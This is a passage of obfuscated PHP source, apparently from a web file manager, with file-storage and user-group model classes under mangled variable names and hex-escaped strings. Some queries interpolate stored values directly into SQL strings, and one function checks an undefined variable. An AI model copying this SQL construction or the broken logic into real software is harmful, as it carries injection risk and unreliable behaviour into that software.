if (!$Ò©Ÿ©Ş—) { $this->fileMd5Set($â¸½“Ğ[$ê­õ£Ù[477]], $â¸½“Ğ[$ê­õ£Ù[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($”‘€òú™, $’ş„™šû) { $ôÚçùø¨ =& $_SERVER[ï»»·÷á]; $ö²‘ÏÔé = $this->find($”‘€òú™); if (!$ö²‘ÏÔé || $ö²‘ÏÔé[$ôÚçùø¨[176]]) { return; } $©Í‘£Ïæ = IO::hashMd5($’ş„™šû); if (!$©Í‘£Ïæ) { return $ôÚçùø¨[12]; } $this->where(array($ôÚçùø¨[477] => $”‘€òú™))->save(array($ôÚçùø¨[176] => $©Í‘£Ïæ)); } public function addFileMake($Ò¯³ë©¼, $ºÇûéşÎ, $¸ğ‘²ö„, $×óó‡‹, $Õñò——İ, $ êİ) { $Æ·ó¬ä =& $_SERVER[ï»»·÷á]; $Îñ¿Ò¼† = $this->createFileName($Õñò——İ, $¸ğ‘²ö„, $×óó‡‹); $¬Ôßğáø = get_path_father($Îñ¿Ò¼†); $”øî™ƒá = get_path_this($Îñ¿Ò¼†); if ($ êİ) { $¬Û‰‹‘ = IO::move($Ò¯³ë©¼, $¬Ôßğáø, !1, $”øî™ƒá); } else { $¬Û‰‹‘ = IO::copy($Ò¯³ë©¼, $¬Ôßğáø, !1, $”øî™ƒá); } if (!$¬Û‰‹‘) { return !1; } $«’’…É¢ = KodIO::defaultDriver(); $³ò—Ì = array($Æ·ó¬ä[554] => $ºÇûéşÎ, $Æ·ó¬ä[1928] => 1, $Æ·ó¬ä[429] => $Õñò——İ, $Æ·ó¬ä[821] => $«’’…É¢[$Æ·ó¬ä[399]], $Æ·ó¬ä[430] => $Îñ¿Ò¼†, $Æ·ó¬ä[1929] => $¸ğ‘²ö„, $Æ·ó¬ä[1930] => $×óó‡‹); return $³ò—Ì; } public function addFileCheckExist($«—…÷Î, $ÏÚç¸í, $áÒä”) { $üû ¨ış =& $_SERVER[ï»»·÷á]; $àèôÖİ× = $this->findByHash($«—…÷Î, $ÏÚç¸í); if (!$àèôÖİ×) { return !1; } $Âïû£Ü¤ = array($üû ¨ış[1928] => intval($àèôÖİ×[$üû ¨ış[1935]]) + 1, $üû ¨ış[554] => $áÒä”); $this->where(array($üû ¨ış[478] => $àèôÖİ×[$üû ¨ış[477]]))->save($Âïû£Ü¤); return $àèôÖİ×; } public function remove($ö…Âí–Ñ) { $this->linkCountChange($ö…Âí–Ñ, !1); $this->clearEmpty(); return !0; } public function linkAdd($€¿Å®Í‹) { $this->linkCountChange($€¿Å®Í‹, !0); } public function linkCountChange($êÛœ² , $Ï¿•°‘) { $Ğ¶Á¨°ñ =& $_SERVER[ï»»·÷á]; if (!$êÛœ² ) { return; } if (!is_array($êÛœ² )) { $êÛœ²  = array($êÛœ² ); } $±î¸‡èÆ = array(); foreach ($êÛœ²  as $ÔÈ«Öê) { $Áú‘Š¶¤ = $ÔÈ«Öê . $Ğ¶Á¨°ñ[12]; if (!$±î¸‡èÆ[$Áú‘Š¶¤]) { $±î¸‡èÆ[$Áú‘Š¶¤] = 0; } $±î¸‡èÆ[$Áú‘Š¶¤]++; } $™†ù™ß× = array(); foreach ($±î¸‡èÆ as $ÔÈ«Öê => $°áÊ˜) { $Áú‘Š¶¤ = $°áÊ˜ . $Ğ¶Á¨°ñ[12]; if (!$™†ù™ß×[$Áú‘Š¶¤]) { $™†ù™ß×[$Áú‘Š¶¤] = array(); } $™†ù™ß×[$Áú‘Š¶¤][] = $ÔÈ«Öê; } foreach ($™†ù™ß× as $°áÊ˜ => $µ¯±Â¡) { if (!$µ¯±Â¡) { continue; } $°áÊ˜ = $Ï¿•°‘ ? $°áÊ˜ : -intval($°áÊ˜); $¬ó÷Ä—œ = array($Ğ¶Á¨°ñ[477] => array($Ğ¶Á¨°ñ[7], $µ¯±Â¡)); if ($°áÊ˜ < 0) { $¬ó÷Ä—œ[$Ğ¶Á¨°ñ[1935]] = array($Ğ¶Á¨°ñ[1025], abs($°áÊ˜)); } $this->where($¬ó÷Ä—œ)->setAdd($Ğ¶Á¨°ñ[1935], $°áÊ˜); } } public function findByHash($ê–±ÉÑì, $º»è™ÀÎ = false) { $× ‚ ¥’ =& $_SERVER[ï»»·÷á]; if (!$ê–±ÉÑì && !$º»è™ÀÎ) { return !1; } $áÁà§Í± = array($× ‚ ¥’[1929] => $ê–±ÉÑì); if ($º»è™ÀÎ) { $áÁà§Í± = array($× ‚ ¥’[1930] => $º»è™ÀÎ); } return $this->order($× ‚ ¥’[1936])->where($áÁà§Í±)->find(); } public function clearEmpty($è­ñöá‘ = 0) { $ÅÆäÀ¾Ş =& $_SERVER[ï»»·÷á]; $¡ÎƒŸºô = time() - 3600 * 24 * $è­ñöá‘; $¢›«Àˆ = $ÅÆäÀ¾Ş[1937] . $¡ÎƒŸºô; $ŒÑîèÔ = $this->where($¢›«Àˆ)->select(); if (!$ŒÑîèÔ) { return; } $Ù‘¶À¨¨ = new Task($ÅÆäÀ¾Ş[1938], $ÅÆäÀ¾Ş[12], count($ŒÑîèÔ)); foreach ($ŒÑîèÔ as $¼Çö“Ï) { $Ù‘¶À¨¨->update(1); $this->resetFile($¼Çö“Ï); } $Ù‘¶À¨¨->end(); } public function resetFile($ùÑİúÊ‹) { $—ùÄûˆ´ =& $_SERVER[ï»»·÷á]; $î€¦è‡² = array($—ùÄûˆ´[478] => $ùÑİúÊ‹[$—ùÄûˆ´[477]]); $†îÈğ¹ = Model($—ùÄûˆ´[1349])->where($î€¦è‡²)->count(); $ïÖÌó½º = Model($—ùÄûˆ´[1939])->where($î€¦è‡²)->count(); $®ÀÓÔ = intval($†îÈğ¹) + intval($ïÖÌó½º); if ($®ÀÓÔ == 0) { IO::remove($ùÑİúÊ‹[$—ùÄûˆ´[84]]); Model($—ùÄûˆ´[1940])->delete($ùÑİúÊ‹[$—ùÄûˆ´[477]]); $this->where($î€¦è‡²)->delete(); $this->metaSet($ùÑİúÊ‹[$—ùÄûˆ´[477]], null, null); return; } if ($ùÑİúÊ‹[$—ùÄûˆ´[1935]] != $®ÀÓÔ) { $this->where($î€¦è‡²)->save(array($—ùÄûˆ´[1928] => $®ÀÓÔ)); } } public function storageInfo($şåÕí˜ = false) { $Ø•Ó¢¹ =& $_SERVER[ï»»·÷á]; $Éßƒ¾Š¨ = $this->count() + 0.0; $ïøÉ–û = 0; $†´Ù˜êø = 1; $ã½¦­Í× = 0; $ƒÒÏõ¿ = 5000; for ($“äá›…í = 0; $“äá›…í < $Éßƒ¾Š¨; $“äá›…í = $“äá›…í + $ƒÒÏõ¿) { $·×Š»¯ê = $this->limit($“äá›…í, $“äá›…í + $ƒÒÏõ¿)->select(); foreach ($·×Š»¯ê as $ï¡„¦ø­) { $†´Ù˜êø += $ï¡„¦ø­[$Ø•Ó¢¹[76]] * $ï¡„¦ø­[$Ø•Ó¢¹[1935]]; $ïøÉ–û += $ï¡„¦ø­[$Ø•Ó¢¹[76]] * ($ï¡„¦ø­[$Ø•Ó¢¹[1935]] - 1); $ã½¦­Í× += $ï¡„¦ø­[$Ø•Ó¢¹[1935]]; } } $©ĞöØ = array($Ø•Ó¢¹[1941] => $†´Ù˜êø, $Ø•Ó¢¹[1942] => $ïøÉ–û, $Ø•Ó¢¹[1943] => $ïøÉ–û / $†´Ù˜êø, $Ø•Ó¢¹[80] => $Éßƒ¾Š¨, $Ø•Ó¢¹[1944] => $ã½¦­Í×); return $©ĞöØ; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\160"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\141\155\x65" => "\x67\x72\157\x75\x70\137\155\x65\164\x61", "\155\145\164\x61\x46\x69\145\x6c\x64" => "\147\x72\x6f\165\x70\x49\x44"); protected function cacheFunctionAlias($ªÒ±õª“) { $ŠÜÉı©Â =& $_SERVER[ï»»·÷á]; return array($ŠÜÉı©Â[1945] => array($ªÒ±õª“[0], $ŠÜÉı©Â[1946]), $ŠÜÉı©Â[1947] => array($ªÒ±õª“[0], $ŠÜÉı©Â[1948])); } protected function getInfo($¢Üú¾›§, $’¡ª£Ö° = false) { $°ñõĞŒ = $this->getInfoSimple($¢Üú¾›§); if (!$°ñõĞŒ) { return !1; } if ($’¡ª£Ö°) { return $this->_listDataApplyItem($°ñõĞŒ); } return $this->cacheFunctionGet($_SERVER[ï»»·÷á][1949], $¢Üú¾›§); } protected function getInfoSimple($¤é¦±æŞ, $Ş¯ÃÏÆ = false) { $¬ªş Àµ =& $_SERVER[ï»»·÷á]; if ($Ş¯ÃÏÆ) { $Â·È‘âº = array($¬ªş Àµ[1867] => intval($¤é¦±æŞ)); $‰ï“İşÏ = $this->where($Â·È‘âº)->find(); return is_array($‰ï“İşÏ) ? $‰ï“İşÏ : array(); } return $this->cacheFunctionGet($¬ªş Àµ[1950], $¤é¦±æŞ); } protected function groupAdd($Î¢¨¢ñä) { $ÃÑ÷¶ìÆ =& $_SERVER[ï»»·÷á]; if (!$Î¢¨¢ñä[$ÃÑ÷¶ìÆ[441]] && isset($Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1867]]) && $Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1867]] == 1) { if ($×ı¤µ‘ = $this->getInfoSimple($Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1867]], !0)) { return $Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1867]]; } } else { $×ı¤µ‘ = $this->getInfoSimple($Î¢¨¢ñä[$ÃÑ÷¶ìÆ[441]]); if (!$×ı¤µ‘) { return !1; } } $§ï¡ˆŒò = $ÃÑ÷¶ìÆ[530]; if ($×ı¤µ‘[$ÃÑ÷¶ìÆ[520]]) { $§ï¡ˆŒò = $×ı¤µ‘[$ÃÑ÷¶ìÆ[520]] . $×ı¤µ‘[$ÃÑ÷¶ìÆ[1867]] . $ÃÑ÷¶ìÆ[50]; } $õà†™‡³ = array($ÃÑ÷¶ìÆ[429] => $this->groupNameAuto($Î¢¨¢ñä[$ÃÑ÷¶ìÆ[441]], $Î¢¨¢ñä[$ÃÑ÷¶ìÆ[32]]), $ÃÑ÷¶ìÆ[410] => $Î¢¨¢ñä[$ÃÑ÷¶ìÆ[441]], $ÃÑ÷¶ìÆ[589] => $§ï¡ˆŒò, $ÃÑ÷¶ìÆ[1951] => $Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1854]], $ÃÑ÷¶ìÆ[1952] => 0, $ÃÑ÷¶ìÆ[1871] => 0); if (isset($Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1891]])) { $õà†™‡³[$ÃÑ÷¶ìÆ[1891]] = $Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1891]]; } else { $ˆş×âï  = $this->max($ÃÑ÷¶ìÆ[1891]); if (!$ˆş×âï ) { $ˆş×âï  = 0; } $õà†™‡³[$ÃÑ÷¶ìÆ[1891]] = $ˆş×âï  + 1; } if (!empty($Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1867]])) { $õà†™‡³[$ÃÑ÷¶ìÆ[1867]] = $Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1867]]; } $ªÅêâÂå = $this->add($õà†™‡³); $this->setNamePinyin($ªÅêâÂå, $õà†™‡³[$ÃÑ÷¶ìÆ[32]]); if (isset($Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1953]])) { $this->metaSet($ªÅêâÂå, array($ÃÑ÷¶ìÆ[1953] => $Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1953]], $ÃÑ÷¶ìÆ[1954] => $Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1954]])); unset($Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1953]]); unset($Î¢¨¢ñä[$ÃÑ÷¶ìÆ[1954]]); } Model($ÃÑ÷¶ìÆ[1349])->groupRootAdd($ªÅêâÂå); $this->_clearCache($Î¢¨¢ñä[$ÃÑ÷¶ìÆ[441]]); return $ªÅêâÂå; } protected function groupEdit($ˆ™®‡Ğ, $şóª‰´É) { $Ãòü÷ÓÑ =& $_SERVER[ï»»·÷á]; $‰˜éæ¹¨ = $this->getInfoSimple($ˆ™®‡Ğ); if (!$‰˜éæ¹¨) { return !1; } if (!empty($şóª‰´É[$Ãòü÷ÓÑ[441]])) { $³Ä÷–÷ = $this->getInfoSimple($şóª‰´É[$Ãòü÷ÓÑ[441]]); if (!$³Ä÷–÷) { return !1; } if ($‰˜éæ¹¨[$Ãòü÷ÓÑ[1867]] == $³Ä÷–÷[$Ãòü÷ÓÑ[1867]]) { return !1; } if ($şóª‰´É[$Ãòü÷ÓÑ[441]] != $‰˜éæ¹¨[$Ãòü÷ÓÑ[441]]) { if ($³Ä÷–÷[$Ãòü÷ÓÑ[520]] !== $‰˜éæ¹¨[$Ãòü÷ÓÑ[520]] && strpos($³Ä÷–÷[$Ãòü÷ÓÑ[520]], $‰˜éæ¹¨[$Ãòü÷ÓÑ[520]] . $‰˜éæ¹¨[$Ãòü÷ÓÑ[1867]] . $Ãòü÷ÓÑ[50]) === 0) { return !1; } $şóª‰´É[$Ãòü÷ÓÑ[589]] = $³Ä÷–÷[$Ãòü÷ÓÑ[520]] . $şóª‰´É[$Ãòü÷ÓÑ[441]] . $Ãòü÷ÓÑ[50]; $this->_changeChildLevel($‰˜éæ¹¨, $³Ä÷–÷); $this->_clearCache($³Ä÷–÷[$Ãòü÷ÓÑ[1867]]); $this->_clearCache($‰˜éæ¹¨[$Ãòü÷ÓÑ[441]]); } } if (isset($şóª‰´É[$Ãòü÷ÓÑ[32]])) { $this->setNamePinyin($ˆ™®‡Ğ, $şóª‰´É[$Ãòü÷ÓÑ[32]]); } if (isset($şóª‰´É[$Ãòü÷ÓÑ[1953]])) { $this->metaSet($ˆ™®‡Ğ, array($Ãòü÷ÓÑ[1953] => $şóª‰´É[$Ãòü÷ÓÑ[1953]], $Ãòü÷ÓÑ[1954] => $şóª‰´É[$Ãòü÷ÓÑ[1954]])); unset($şóª‰´É[$Ãòü÷ÓÑ[1953]]); unset($şóª‰´É[$Ãòü÷ÓÑ[1954]]); } $this->_clearChildrenCache($‰˜éæ¹¨); return $this->where(array($Ãòü÷ÓÑ[1955] => $ˆ™®‡Ğ))->save($şóª‰´É); } private function _clearChildrenCache($È¢Ø†£Ø) { $®Ó´Ëõ¿ =& $_SERVER[ï»»·÷á]; $œ‚í÷Í´ = array($®Ó´Ëõ¿[589] => array($®Ó´Ëõ¿[549], $È¢Ø†£Ø[$®Ó´Ëõ¿[520]] . $È¢Ø†£Ø[$®Ó´Ëõ¿[1867]] . $®Ó´Ëõ¿[550])); $¸îĞè‘ë = $this->field($®Ó´Ëõ¿[1867])->where($œ‚í÷Í´)->select(); foreach ($¸îĞè‘ë as $½ü½·Œ) { $this->_clearCache($½ü½·Œ[$®Ó´Ëõ¿[1867]]); } } private function _clearCache($Ú¬ò–Á½) { $è²ñ‰ÂÀ =& $_SERVER[ï»»·÷á]; $this->cacheFunctionClear($è²ñ‰ÂÀ[1949], $Ú¬ò–Á½); $this->cacheFunctionClear($è²ñ‰ÂÀ[1950], $Ú¬ò–Á½); } private function _changeChildLevel($ªäŸ¡¯³, $¦Ëõ‹½, $†·Œ‚üÌ = false) { $¨ƒ°æµÅ =& $_SERVER[ï»»·÷á]; $ïèÓ‘ù– = $ªäŸ¡¯³[$¨ƒ°æµÅ[520]] . $ªäŸ¡¯³[$¨ƒ°æµÅ[1867]] . $¨ƒ°æµÅ[50]; $¿Ö°İ…§ = $¦Ëõ‹½[$¨ƒ°æµÅ[520]] . $¦Ëõ‹½[$¨ƒ°æµÅ[1867]] . $¨ƒ°æµÅ[50] . $ªäŸ¡¯³[$¨ƒ°æµÅ[1867]] . $¨ƒ°æµÅ[50]; if ($†·Œ‚üÌ) { $¿Ö°İ…§ = $¦Ëõ‹½[$¨ƒ°æµÅ[520]] . $¦Ëõ‹½[$¨ƒ°æµÅ[1867]] . $¨ƒ°æµÅ[50]; } $â–ÅÚ¸Š = array($¨ƒ°æµÅ[589] => array($¨ƒ°æµÅ[549], $ªäŸ¡¯³[$¨ƒ°æµÅ[520]] . $ªäŸ¡¯³[$¨ƒ°æµÅ[1867]] . $¨ƒ°æµÅ[550])); $€ÌŒÄŸ¦ = array($¨ƒ°æµÅ[589] => array($¨ƒ°æµÅ[598], "\x72\145\160\x6c\x61\143\x65\50\160\141\162\145\156\x74\114\x65\166\x65\154\x2c\47{$ïèÓ‘ù–}\47\x2c\x27{$¿Ö°İ…§}\47\51")); $this->_clearChildrenCache($ªäŸ¡¯³); $this->where($â–ÅÚ¸Š)->data($€ÌŒÄŸ¦)->save(); } public function setNamePinyin($ Ç‹š¨¶, $Î¿Ñ‹—ã = false) { $‚ûÊ‰Š¨ =& $_SERVER[ï»»·÷á]; if (!$Î¿Ñ‹—ã) { $êÒüÄ­§ = $this->getInfoSimple($ Ç‹š¨¶); $Î¿Ñ‹—ã = $êÒüÄ­§[$‚ûÊ‰Š¨[32]]; } if (!Input::check($Î¿Ñ‹—ã, $‚ûÊ‰Š¨[592])) { $this->metaSet($ Ç‹š¨¶, $‚ûÊ‰Š¨[474], null); $this->metaSet($ Ç‹š¨¶, $‚ûÊ‰Š¨[473], null); return; } $ Ÿµ²ß = array($‚ûÊ‰Š¨[474] => str_replace($‚ûÊ‰Š¨[53], $‚ûÊ‰Š¨[12], Pinyin::get($Î¿Ñ‹—ã)), $‚ûÊ‰Š¨[473] => Pinyin::get($Î¿Ñ‹—ã, $‚ûÊ‰Š¨[593])); $this->metaSet($ Ç‹š¨¶, $ Ÿµ²ß); } protected function groupStatus($åš’°§, $ìÅ÷ÍÛ) { $ÍÑ“­› =& $_SERVER[ï»»·÷á]; $Ş‹à³™ = $this->getInfoSimple($åš’°§); if (!$Ş‹à³™) { return !1; } if ($ìÅ÷ÍÛ == $ÍÑ“­›[88]) { $ñ‡›Ô¡Ø = $this->parentLevelArray($Ş‹à³™[$ÍÑ“­›[520]]); } else { $Ô–‰Âõ‚ = array($ÍÑ“­›[589] => array($ÍÑ“­›[549], $Ş‹à³™[$ÍÑ“­›[520]] . $Ş‹à³™[$ÍÑ“­›[1867]] . $ÍÑ“­›[550])); $ñ‡›Ô¡Ø = $this->where($Ô–‰Âõ‚)->field($ÍÑ“­›[1867])->select(); $ñ‡›Ô¡Ø = array_to_keyvalue($ñ‡›Ô¡Ø, $ÍÑ“­›[12], $ÍÑ“­›[1867]); } $ñ‡›Ô¡Ø[] = $Ş‹à³™[$ÍÑ“­›[1867]]; $¡ìÂÉğå = array(); foreach ($ñ‡›Ô¡Ø as $åš’°§) { $¡ìÂÉğå[] = array($ÍÑ“­›[1867] => $åš’°§, $ÍÑ“­›[94] => $ÍÑ“­›[762], $ÍÑ“­›[374] => $ìÅ÷ÍÛ); $this->_clearCache($åš’°§); } return Model($ÍÑ“­›[1956])->addAll($¡ìÂÉğå, array(), !0); } protected function groupRemove($šÔ½ø¬º, $ãéú®Œ = false) { $±––Áµù =& $_SERVER[ï»»·÷á]; $¶£ÆÙŞ = array($±––Áµù[1867] => $šÔ½ø¬º); $àÀ•ÚÁ· = $this->where($¶£ÆÙŞ)->find(); if (!$àÀ•ÚÁ· || $àÀ•ÚÁ·[$±––Áµù[441]] == 0) { return !1; } if (!$ãéú®Œ) { $˜ÔŠ”Ñã = $this->getInfoSimple($àÀ•ÚÁ·[$±––Áµù[441]]); $this->_changeChildLevel($àÀ•ÚÁ·, $˜ÔŠ”Ñã, !0); $this->where(array($±––Áµù[441] => $šÔ½ø¬º))->save(array($±––Áµù[441] => $àÀ•ÚÁ·[$±––Áµù[441]])); $this->_clearCache($˜ÔŠ”Ñã[$±––Áµù[1867]]); } Model($±––Áµù[1956])->where($¶£ÆÙŞ)->delete(); Model($±––Áµù[1957])->where($¶£ÆÙŞ)->delete(); Model($±––Áµù[838])->groupRootRemove($šÔ½ø¬º); $this->_clearCache($àÀ•ÚÁ·[$±––Áµù[441]]); return $this->where($¶£ÆÙŞ)->delete(); } protected function groupSort($òÄ¬•´ø) { $äÕøß›† =& $_SERVER[ï»»·÷á]; $šÚùúõ = array(); foreach ($òÄ¬•´ø as $ŸÎöÌûË => $æªáÂå°) { $šÚùúõ[] = array($äÕøß›†[1867], $æªáÂå°, $äÕøß›†[1891], $ŸÎöÌûË + 1); } $this->saveAll($šÚùúõ); } public function listData() { $¹‡³•ıœ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¹‡³•ıœ[$_SERVER[ï»»·÷á][369]]); return $¹‡³•ıœ; } private function _makeOrder($Ä§Ö‰ş— = '') { $ÃÙì§© =& $_SERVER[ï»»·÷á]; $ı™Œ”ô = array($ÃÙì§©[1867], $ÃÙì§©[32], $ÃÙì§©[1856], $ÃÙì§©[201]); $±óÏÃµ = array($ÃÙì§©[459] => $ÃÙì§©[460], $ÃÙì§©[461] => $ÃÙì§©[462]); $ø¨ÍõÜæ = Input::get($ÃÙì§©[466], $ÃÙì§©[7], $ÃÙì§©[1871], $ı™Œ”ô); $Ëı­úìŒ = Input::get($ÃÙì§©[467], $ÃÙì§©[7], $ÃÙì§©[1958], array($ÃÙì§©[1958], $ÃÙì§©[461])); $Ëı­úìŒ = $±óÏÃµ[$Ëı­úìŒ]; $Ä§Ö‰ş— = $Ä§Ö‰ş— . "{$ø¨ÍõÜæ}\x20{$Ëı­úìŒ}\x2c\40\147\162\x6f\x75\x70\x49\x44\x20\x61\163\x63"; return $this->order($Ä§Ö‰ş—); } public function listChild($èËÖ‰ÆØ) { $éÉçŸôµ =& $_SERVER[ï»»·÷á]; $ì£ù²í‡ = $this->where(array($éÉçŸôµ[441] => $èËÖ‰ÆØ))->_makeOrder()->selectPage(200); $this->_listDataApply($ì£ù²í‡[$éÉçŸôµ[369]]); return $ì£ù²í‡; } public function listChildIds($õåÏ»íõ) { $‡®³ÇÔŠ =& $_SERVER[ï»»·÷á]; if (is_string($£ù¶ÛâŒ)) { $õåÏ»íõ = explode($‡®³ÇÔŠ[50], $õåÏ»íõ); } $ç×‰åÕ = $this->where(array($‡®³ÇÔŠ[1867] => array($‡®³ÇÔŠ[7], $õåÏ»íõ)))->field($‡®³ÇÔŠ[1959])->select(); if (!$ç×‰åÕ) { return !1; } $ø·ÛÍ‘ = array(); foreach ($ç×‰åÕ as $Ã‚ÊŞÕí) { $ø·ÛÍ‘[] = "\163\145\154\x65\x63\x74\x20\147\162\157\165\160\x49\104\x20\x66\162\157\155\40\x60\147\x72\x6f\165\160\140\40\167\x68\x65\162\x65\x20\160\x61\162\x65\x6e\x74\114\145\x76\x65\154\x20\x6c\151\x6b\145\40\x27{$Ã‚ÊŞÕí[$‡®³ÇÔŠ[520]]}{$Ã‚ÊŞÕí[$‡®³ÇÔŠ[1867]]}\x2c\x25\x27"; } $ø·ÛÍ‘ = implode($‡®³ÇÔŠ[1960], $ø·ÛÍ‘); $ç×‰åÕ = $this->query($ø·ÛÍ‘); if (!$ç×‰åÕ) { return array(); } $õåÏ»íõ = array_to_keyvalue($ç×‰åÕ, $‡®³ÇÔŠ[12], $‡®³ÇÔŠ[1867]); return array_unique($õåÏ»íõ); } public function listByID($·ñ®ï½Ú) { $›á¶×ÅÄ =& $_SERVER[ï»»·÷á]; if (!$·ñ®ï½Ú) { return array(); } $ªÅš——û = array($›á¶×ÅÄ[1867] => array($›á¶×ÅÄ[7], $·ñ®ï½Ú)); $…‹Ÿ¢£ = $this->where($ªÅš——û)->select(); $…‹Ÿ¢£ = array_sort_keep($…‹Ÿ¢£, $›á¶×ÅÄ[1867], $·ñ®ï½Ú); $this->_listDataApply($…‹Ÿ¢£); return $…‹Ÿ¢£; } public function listSearch($¤™Ö•ö) { $˜ªà©æˆ =& $_SERVER[ï»»·÷á]; $ğ¡Ù¿íÓ = $¤™Ö•ö[$˜ªà©æˆ[1961]]; $›É›ŠÑ = isset($¤™Ö•ö[$˜ªà©æˆ[1962]]) ? $¤™Ö•ö[$˜ªà©æˆ[1962]] : !1; if (!trim($ğ¡Ù¿íÓ)) { return !1; } $ğ¡Ù¿íÓ = str_replace($˜ªà©æˆ[1963], $˜ªà©æˆ[1964], $ğ¡Ù¿íÓ); $ç‚”ÄÀ‹ = array($˜ªà©æˆ[1867] => array($˜ªà©æˆ[383], "{$ğ¡Ù¿íÓ}\x25"), $˜ªà©æˆ[32] => array($˜ªà©æˆ[383], "\x25{$ğ¡Ù¿íÓ}\x25"), $˜ªà©æˆ[1010] => $˜ªà©æˆ[1965]); if ($›É›ŠÑ) { $è¥©¶ø  = $this->getInfoSimple($›É›ŠÑ); $ÅÕË§µ³ = $è¥©¶ø [$˜ªà©æˆ[520]] . $›É›ŠÑ . $˜ªà©æˆ[550]; $ç‚”ÄÀ‹ = array($ç‚”ÄÀ‹, array($˜ªà©æˆ[520] => array($˜ªà©æˆ[383], $ÅÕË§µ³))); } $ç‚”ÄÀ‹ = $this->parseWhereLike($ç‚”ÄÀ‹); $¯Ó…ê¢ = $this->_makeOrder()->where($ç‚”ÄÀ‹)->selectPage(20); $¯Ó…ê¢ = $¯Ó…ê¢ ? $¯Ó…ê¢ : array($˜ªà©æˆ[369] => array(), $˜ªà©æˆ[366] => array()); if (!$¯Ó…ê¢ || count($¯Ó…ê¢[$˜ªà©æˆ[369]]) < 5 && Input::check($ğ¡Ù¿íÓ, $˜ªà©æˆ[318])) { $‘ŠŠÒ¤­ = $this->groupChildrenAll($›É›ŠÑ); $ÑËõ–ôÚ = $this->_searchFromMeta($˜ªà©æˆ[473], $ğ¡Ù¿íÓ, 10, $‘ŠŠÒ¤­); $ÔïÜà—— = $this->_searchFromMeta($˜ªà©æˆ[474], $ğ¡Ù¿íÓ, 10, $‘ŠŠÒ¤­); $ÃŞ²‹û¢ = array_merge($ÑËõ–ôÚ, $ÔïÜà——, $¯Ó…ê¢[$˜ªà©æˆ[369]]); $¯Ó…ê¢[$˜ªà©æˆ[369]] = array_unique_by_key($ÃŞ²‹û¢, $˜ªà©æˆ[1867]); $¯Ó…ê¢[$˜ªà©æˆ[366]][$˜ªà©æˆ[367]] = count($¯Ó…ê¢[$˜ªà©æˆ[369]]); $¯Ó…ê¢[$˜ªà©æˆ[366]][$˜ªà©æˆ[368]] = ceil($¯Ó…ê¢[$˜ªà©æˆ[366]][$˜ªà©æˆ[367]] / $¯Ó…ê¢[$˜ªà©æˆ[366]][$˜ªà©æˆ[363]]); } $this->_listDataApply($¯Ó…ê¢[$˜ªà©æˆ[369]]); return $¯Ó…ê¢; } protected function groupChildrenAll($è«Íôˆş) { $öõÇÄ•€ =& $_SERVER[ï»»·÷á]; if (!$è«Íôˆş) { return !1; } if (is_string($è«Íôˆş)) { $è«Íôˆş = array($è«Íôˆş); } $¢»ËÊ±Ğ = $è«Íôˆş; foreach ($è«Íôˆş as $Çàõ¢ôˆ) { $áÓç¸ö× = $this->getInfoSimple($Çàõ¢ôˆ); $íÁ¬Ñ´ = array($öõÇÄ•€[520] => array($öõÇÄ•€[383], $áÓç¸ö×[$öõÇÄ•€[520]] . $Çàõ¢ôˆ . $öõÇÄ•€[550])); $ùÃÃŞ¦ = $this->field($öõÇÄ•€[1867])->where($íÁ¬Ñ´)->select(); $¢»ËÊ±Ğ = array_merge($¢»ËÊ±Ğ, array_to_keyvalue($ùÃÃŞ¦, $öõÇÄ•€[12], $öõÇÄ•€[1867])); } return array_unique($¢»ËÊ±Ğ); } private function _searchFromMeta($Ï³Ûâãº, $¼ş¶ıÚ, $ğîæèÄö, $Í£·…ÈÉ) { $Ğ¦Ï¦¶ä =& $_SERVER[ï»»·÷á]; $¼ş¶ıÚ = strtolower($¼ş¶ıÚ); $¥¶Â»™« = array($Ğ¦Ï¦¶ä[94] => $Ï³Ûâãº, $Ğ¦Ï¦¶ä[374] => array($Ğ¦Ï¦¶ä[383], "\45{$¼ş¶ıÚ}\45")); $¥¶Â»™« = $this->parseWhereLike($¥¶Â»™«); if ($Í£·…ÈÉ) { $¥¶Â»™«[$Ğ¦Ï¦¶ä[1867]] = array($Ğ¦Ï¦¶ä[7], $Í£·…ÈÉ); } $¬İ•Ê¶ = Model($Ğ¦Ï¦¶ä[1966])->where($¥¶Â»™«)->limit($ğîæèÄö)->select(); if (!$¬İ•Ê¶) { return array(); } $¬İ•Ê¶ = array_to_keyvalue($¬İ•Ê¶, $Ğ¦Ï¦¶ä[12], $Ğ¦Ï¦¶ä[1867]); $Ó•Â¦ÇÛ = $this->where(array($Ğ¦Ï¦¶ä[1955] => array($Ğ¦Ï¦¶ä[7], $¬İ•Ê¶)))->select(); if (!$Ó•Â¦ÇÛ) { return array(); } return $Ó•Â¦ÇÛ; } protected function _listDataApplyItem($“Å‚ò¬ç) { $›ĞåÂÄ‚ = array($“Å‚ò¬ç); $this->_listDataApply($›ĞåÂÄ‚); return $›ĞåÂÄ‚[0]; } protected function _listDataApply(&$™‚¿„Ñ¿) { $°şõ¼ıÀ =& $_SERVER[ï»»·÷á]; if (!$™‚¿„Ñ¿) { return; } $í¯–„ = array_to_keyvalue($™‚¿„Ñ¿, $°şõ¼ıÀ[12], $°şõ¼ıÀ[1867]); $this->_listAppendChildren($™‚¿„Ñ¿); $this->_listAppendChildrenMember($™‚¿„Ñ¿); $this->_listAppendMeta($™‚¿„Ñ¿, $í¯–„); $this->_listAppendParent($™‚¿„Ñ¿); $this->_listAppendSourceRoot($™‚¿„Ñ¿, $í¯–„); } private function _listAppendChildren(&$ä•£ğÀ) { $–»ŠƒûÒ =& $_SERVER[ï»»·÷á]; $ÆàòÕë = array_to_keyvalue($ä•£ğÀ, $–»ŠƒûÒ[12], $–»ŠƒûÒ[1867]); $ì¶şÊÎ = array($–»ŠƒûÒ[441] => array($–»ŠƒûÒ[7], 